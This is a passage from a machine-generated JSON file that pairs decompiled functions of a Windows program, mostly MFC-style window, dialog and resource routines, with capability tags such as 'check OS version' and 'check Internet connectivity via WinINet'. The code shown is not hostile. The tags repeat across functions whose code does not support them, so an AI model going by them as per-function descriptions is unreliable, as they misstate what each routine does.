            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0042331a(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t *piVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_8h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    if (arg_8h_00 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.0041b576(arg_8h_00);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0041b576(arg_8h_00);\n            if (iVar1 == 0) {\n                uVar2 = fcn.0041baa4(0x426e5d);\n                *(unaff_EBP + -4) = 0;\n                *(unaff_EBP + 8) = uVar2;\n                iVar1 = fcn.00409e4e();\n                if (iVar1 == 0) {\n                    fcn.004198b2();\n                }\n                (**(extraout_ECX + 0x14))(iVar1);\n                piVar3 = fcn.0041b715(arg_8h_00);\n                uVar2 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 0xffffffff;\n                *piVar3 = iVar1;\n                fcn.0041baa4(uVar2);\n                piVar3 = *(extraout_ECX + 0x58) + iVar1;\n                *piVar3 = arg_8h_00;\n                if (*(extraout_ECX + 0x5c) == 2) {\n                    piVar3[1] = arg_8h_00;\n                }\n            }\n            else {\n                piVar3 = *(extraout_ECX + 0x58) + iVar1;\n                *piVar3 = arg_8h_00;\n                if (*(extraout_ECX + 0x5c) == 2) {\n                    piVar3[1] = arg_8h_00;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 618
    },
    "0041a476": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041a476(code **param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = vtable.CImageList.0;\n    if (param_1[1] == NULL) {\n        return 0;\n    }\n    uVar1 = fcn.0041a428();\n    uVar1 = (*_sym.imp.COMCTL32.dll_ImageList_Destroy)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 100
    },
    "0041ab79": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ab79(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    \n    iVar1 = fcn.0043500e();\n    iVar2 = *(iVar1 + 0x3c);\n    if (arg_8h == 0) {\n        if ((*(in_ECX + 0x38) & arg_ch) != 0) {\n            if (*(iVar1 + 0x40) == in_ECX) {\n                fcn.0041e4d9(1);\n            }\n            if ((iVar2 != 0) && (*(iVar2 + 0x1c) != 0)) {\n                fcn.0040bbe0(&var_30h, 0, 0x30);\n                var_28h = *(in_ECX + 0x1c);\n                var_30h = 0x28;\n                var_2ch = 1;\n                var_24h = var_28h;\n                (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x1c), 0x405, 0, &var_30h);\n            }\n            *(in_ECX + 0x38) = *(in_ECX + 0x38) & ~arg_ch;\n        }\n    }\n    else if ((*(in_ECX + 0x38) & arg_ch) == 0) {\n        iVar2 = fcn.00434fe8();\n        *(iVar2 + 0x1034) = 0x41ab69;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) | arg_ch;\n    }\n    return 1;\n}\n",
        "token_count": 421
    },
    "0041ac47": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0041ac47(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar1 = fcn.0041b06a(param_1 + 0x14, *(param_1 + 0x18), 0xc);\n        iVar3 = *(param_1 + 0x18);\n        puVar2 = iVar1 + -8 + iVar3 * 0xc;\n        if (-1 < iVar3 + -1) {\n            do {\n                *puVar2 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar2;\n                puVar2 = puVar2 + -3;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    puVar2 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = *puVar2;\n    puVar2[1] = unaff_EDI;\n    *puVar2 = unaff_ESI;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    if (puVar2 != 0xfffffff8) {\n        fcn.00402330();\n    }\n    return puVar2;\n}\n",
        "token_count": 334
    },
    "0041af5a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041af5a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint uStack8;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uStack8 = 0xc;\n        iVar1 = fcn.0041b06a(param_1 + 0x14, *(param_1 + 0x18));\n        iVar3 = *(param_1 + 0x18);\n        puVar2 = iVar1 + -8 + iVar3 * 0xc;\n        if (-1 < iVar3 + -1) {\n            do {\n                *puVar2 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar2;\n                puVar2 = puVar2 + -3;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    puVar2 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = *puVar2;\n    puVar2[1] = uStack8;\n    *puVar2 = unaff_ESI;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    puVar2[2] = 0;\n    return;\n}\n",
        "token_count": 321
    },
    "0041b06a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041b06a(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    \n    if ((param_2 != 0) && (param_3 != 0)) {\n        puVar2 = fcn.0041bab6(param_2 * param_3 + 4);\n        *puVar2 = *param_1;\n        *param_1 = puVar2;\n        return;\n    }\n    fcn.004198e6();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 144
    },
    "0041b4ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041b4ae(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        param_2 = 0x11;\n    }\n    if (*(param_1 + 4) != 0) {\n        fcn.0041bae1(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    if (param_3 != 0) {\n        uVar1 = fcn.0041bab6(param_2 << 2);\n        *(param_1 + 4) = uVar1;\n        fcn.0040bbe0(uVar1, 0, param_2 << 2);\n    }\n    *(param_1 + 8) = param_2;\n    return;\n}\n",
        "token_count": 198
    },
    "0041b6ca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b6ca(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar2 = fcn.0041b06a(param_1 + 0x14, *(param_1 + 0x18), 0xc);\n        iVar4 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -8 + iVar4 * 0xc;\n        if (-1 < iVar4 + -1) {\n            do {\n                *puVar3 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar3;\n                puVar3 = puVar3 + -3;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    uVar1 = *puVar3;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar1;\n    puVar3[1] = 0;\n    puVar3[2] = 0;\n    return;\n}\n",
        "token_count": 306
    },
    "0041b7d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0041b7d5(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar2 = fcn.0041b06a(param_1 + 0x14, *(param_1 + 0x18), 0x10);\n        iVar4 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -0xc + iVar4 * 0x10;\n        if (-1 < iVar4 + -1) {\n            do {\n                *puVar3 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar3;\n                puVar3 = puVar3 + -4;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    uVar1 = *puVar3;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar1;\n    if (puVar3 != 0xfffffff8) {\n        fcn.00402330();\n    }\n    puVar3[3] = 0;\n    return puVar3;\n}\n",
        "token_count": 327
    },
    "0041b9b1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b9b1(int32_t *param_1)\n\n{\n    if (0 < param_1[1]) {\n        (**(*param_1 + 4))(1);\n    }\n    return;\n}\n",
        "token_count": 52
    },
    "0041bb37": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0041bb37(int32_t param_1, int32_t param_2)\n\n{\n    if (param_2 != 0) {\n        for (; param_1 != 0; param_1 = *(param_1 + 0x10)) {\n            if (param_1 == param_2) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 92
    },
    "0041bc06": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bc06(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (arg_ch == 0) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_10h != 0) {\n            do {\n                arg_10h = arg_10h + -1;\n                arg_ch = fcn.0040c38a(arg_ch, arg_14h);\n                if (arg_ch == 0) {\n                    fcn.004014a0();\n                    return 0;\n                }\n                arg_ch = arg_ch + 1;\n            } while (arg_10h != 0);\n        }\n        iVar2 = fcn.0040c38a(arg_ch, arg_14h);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_ch);\n        }\n        else {\n            iVar2 = iVar2 - arg_ch;\n        }\n        uVar1 = fcn.00408978(iVar2, arg_ch, iVar2);\n        fcn.0040b7b0(uVar1, iVar2, arg_ch);\n        fcn.00407fe0(0xffffffff);\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 310
    },
    "0041be83": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041be83(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint32_t arg_ch_00;\n    int32_t *piVar4;\n    \n    if (arg_ch == 0xfffffffe) {\n        iVar1 = fcn.00434fe8();\n        iVar1 = (**(**(iVar1 + 0x1038) + 4))();\n        return iVar1;\n    }\n    if (arg_ch == 0xfffffffd) {\n        iVar1 = *(arg_10h + 0x30);\n        arg_ch = 0;\n        puVar2 = (**(*in_ECX + 0x2c))();\n        do {\n            if (puVar2 == NULL) {\n                return arg_ch;\n            }\n            if (arg_ch != 0) {\n                return arg_ch;\n            }\n            piVar4 = puVar2[1];\n            while (((piVar4[1] != 0 && (piVar4[2] != 0)) && (arg_ch == 0))) {\n                if (arg_8h == piVar4[1]) {\n                    if (iVar1 == 0) {\n                        if (*piVar4 == 0) {\ncode_r0x0041bf0f:\n                            *(arg_10h + 4) = piVar4[2];\n                            arg_ch = 1;\n                        }\n                    }\n                    else if ((*piVar4 != 0) && (iVar3 = fcn.00408b71(iVar1, *piVar4),  iVar3 != 0))\n                    goto code_r0x0041bf0f;\n                }\n                piVar4 = piVar4 + 3;\n            }\n            puVar2 = *puVar2;\n        } while( true );\n    }\n    if (arg_ch != 0xffffffff) {\n        arg_ch_00 = arg_ch >> 0x10;\n        arg_ch = arg_ch & 0xffff;\n        if (arg_ch_00 != 0) goto code_r0x0041bf48;\n    }\n    arg_ch_00 = 0x111;\ncode_r0x0041bf48:\n    puVar2 = (**(*in_ECX + 0x28))();\n    while( true ) {\n        if (puVar2 == NULL) {\n            return 0;\n        }\n        iVar1 = fcn.0041da9d(puVar2[1], arg_ch_00, arg_ch, arg_8h);\n        if (iVar1 != 0) break;\n        puVar2 = *puVar2;\n    }\n    iVar1 = fcn.0041bd6d(in_ECX, arg_8h, arg_ch, *(iVar1 + 0x14), arg_10h, *(iVar1 + 0x10), arg_14h);\n    return iVar1;\n}\n",
        "token_count": 667
    },
    "0041c9cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: hResData\n// WARNING: Variable defined which should be unmapped: hWnd\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t fcn.0041c9cf(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t noname_0;\n    uint noname_1;\n    uint32_t uVar3;\n    int32_t *extraout_ECX;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_10h;\n    int32_t *noname_4;\n    uint var_20h;\n    uint var_1ch;\n    uint hResData;\n    uint hWnd;\n    uint in_stack_ffffffec;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    uint noname_13;\n    \n    noname_13 = 0x41c9d9;\n    fcn.0040bb7c();\n    iVar1 = extraout_ECX[0x16];\n    noname_0 = extraout_ECX[0x17];\n    *(unaff_EBP + -0x10) = &fcn.0041c9cf::var_20h;\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    *(unaff_EBP + -0x18) = iVar1;\n    var_20h = unaff_EDI;\n    var_1ch = unaff_ESI;\n    hResData = unaff_EBX;\n    iVar1 = fcn.00434fe8();\n    uVar4 = *(iVar1 + 0xc);\n    if (extraout_ECX[0x15] != 0) {\n        iVar1 = fcn.00434fe8();\n        uVar4 = *(iVar1 + 0xc);\n        uVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar4, extraout_ECX[0x15], 5);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar4, uVar2);\n        *(unaff_EBP + -0x18) = uVar2;\n    }\n    if (*(unaff_EBP + -0x18) != 0) {\n        noname_0 = (*_sym.imp.KERNEL32.dll_LockResource)(*(unaff_EBP + -0x18));\n    }\n    if (noname_0 == 0) {\n        iVar1 = -1;\n    }\n    else {\n        uVar2 = fcn.0041c50f();\n        *(unaff_EBP + -0x14) = uVar2;\n        fcn.0041ef5f();\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + -0x14) != 0) {\n            iVar1 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n            if (*(unaff_EBP + -0x14) != iVar1) {\n                iVar1 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*(unaff_EBP + -0x14));\n                if (iVar1 != 0) {\n                    (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 0);\n                    *(unaff_EBP + -0x20) = 1;\n                }\n            }\n        }\n        *(unaff_EBP + -4) = 0;\n        noname_4 = extraout_ECX;\n        fcn.00420590();\n        uVar2 = *(unaff_EBP + -0x14);\n        noname_1 = fcn.0041eeb7();\n        iVar1 = fcn.0041c7c2(noname_0, noname_1, uVar4, uVar2, noname_4, var_20h, var_1ch, hResData, hWnd, \n                             in_stack_ffffffec, var_ch, in_stack_fffffff4, var_4h, noname_13, unaff_retaddr, param_1, \n                             param_2, param_3, var_10h, param_5, param_6);\n        if (iVar1 != 0) {\n            if ((*(extraout_ECX + 0xe) & 0x10) != 0) {\n                uVar4 = 4;\n                uVar3 = fcn.0041cced();\n                if ((uVar3 & 0x100) != 0) {\n                    uVar4 = 5;\n                }\n                fcn.0041e95b(uVar4);\n            }\n            if (extraout_ECX[7] != 0) {\n                fcn.0041ce37(0, 0, 0, 0, 0, 0x97);\n            }\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x20) != 0) {\n            (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 1);\n        }\n        if (*(unaff_EBP + -0x14) != 0) {\n            iVar1 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            if (iVar1 == extraout_ECX[7]) {\n                (*_sym.imp.USER32.dll_SetActiveWindow)(*(unaff_EBP + -0x14));\n            }\n        }\n        (**(*extraout_ECX + 0x60))();\n        fcn.0041c549();\n        if (extraout_ECX[0x15] != 0) {\n            (*_sym.imp.KERNEL32.dll_FreeResource)(*(unaff_EBP + -0x18));\n        }\n        iVar1 = extraout_ECX[0x10];\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 1432
    },
    "0041cc24": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041cc24(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x48) != 0) {\n    // WARNING: Could not recover jumptable at 0x0041cc2f. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (**(**(param_1 + 0x48) + 0x98))();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "0041cc3a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041cc3a(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x48) != 0) {\n    // WARNING: Could not recover jumptable at 0x0041cc45. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (**(**(param_1 + 0x48) + 0x54))();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "0041cc4d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041cc4d(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x48) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 0x1c), param_2);\n        fcn.0041eeb7(uVar1);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041cc6e. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x48) + 0x74))();\n    return;\n}\n",
        "token_count": 157
    },
    "0041cc71": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041cc71(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *unaff_retaddr;\n    \n    if (*(param_1 + 0x48) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 0x1c), param_2);\n        *unaff_retaddr = uVar1;\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041cc92. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x48) + 0x70))();\n    return;\n}\n",
        "token_count": 161
    },
    "0041cc95": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041cc95(int32_t param_1, uint param_2, uint param_3)\n\n{\n    if (*(param_1 + 0x48) == 0) {\n        (*_sym.imp.USER32.dll_SetDlgItemTextA)(*(param_1 + 0x1c), param_2, param_3);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041ccb4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x48) + 0x88))();\n    return;\n}\n",
        "token_count": 142
    },
    "0041cced": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041cced(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(param_1 + 0x1c), 0xfffffff0);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041cd04. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x78))();\n    return;\n}\n",
        "token_count": 131
    },
    "0041cd07": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041cd07(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(param_1 + 0x1c), 0xffffffec);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041cd1e. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x7c))();\n    return;\n}\n",
        "token_count": 132
    },
    "0041cd21": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cd21(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        fcn.0041d844(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041cd45. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x80))();\n    return;\n}\n",
        "token_count": 151
    },
    "0041cd4b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cd4b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        fcn.0041d85e(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041cd6f. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x84))();\n    return;\n}\n",
        "token_count": 154
    },
    "0041cd75": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041cd75(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_SetWindowTextA)(*(param_1 + 0x1c), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041cd90. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x88))();\n    return;\n}\n",
        "token_count": 134
    },
    "0041cd96": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
